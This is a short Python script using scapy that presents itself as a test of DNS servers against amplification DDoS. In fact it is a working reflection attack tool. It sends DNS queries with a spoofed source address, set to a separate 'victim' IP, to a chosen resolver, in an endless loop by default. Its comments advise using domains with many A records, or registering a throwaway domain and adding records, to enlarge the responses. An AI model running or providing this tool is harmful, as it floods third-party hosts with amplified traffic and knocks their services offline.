#!/usr/bin/env python3
# Description: Test DNS server against amplification DDoS Attack
# Depends on:  scapy

import argparse
from random import choice

from scapy.all import *

# Populate this list with domain names with lots of A records.
# IRC server DNS pools are a good place to look.
# Maybe get a cheap throwaway domain and add your own A records.
names = ['irc.efnet.net', 'irc.dal.net', 'irc.undernet.org',
         'irc.freenode.net']

iface = get_working_if()

parser = argparse.ArgumentParser(add_help=True,
        description='Test your DNS server against amplification DDoS Attack')

parser.add_argument('-i',
        action="store", dest="iface", default=iface,
        help=f'interface name (default is {iface}')

parser.add_argument('-v',
        required=True, action="store", dest="victim",
        help='IP address of the victim')

parser.add_argument('-t',
        required=True, action="store", dest="target",
        help='IP address of the misconfigured DNS')

parser.add_argument('-c',
        action="store", dest="count",
        help='count of packets to sent')

args = parser.parse_args()

if os.getuid() != 0:
    print('Must be superuser.')
    sys.exit(1)

pkt = IP(dst=args.target, src=args.victim)/\
        UDP(dport=53)/\
        DNS(rd=1, qd=DNSQR(qname=choice(names)))

if args.count:
    send(pkt, count=int(args.count), iface=args.iface, verbose=1)
else:
    send(pkt, loop=1, iface=args.iface, verbose=1)

# vim:sw=4:ts=4:sts=4:et:cc=72
# End of file.
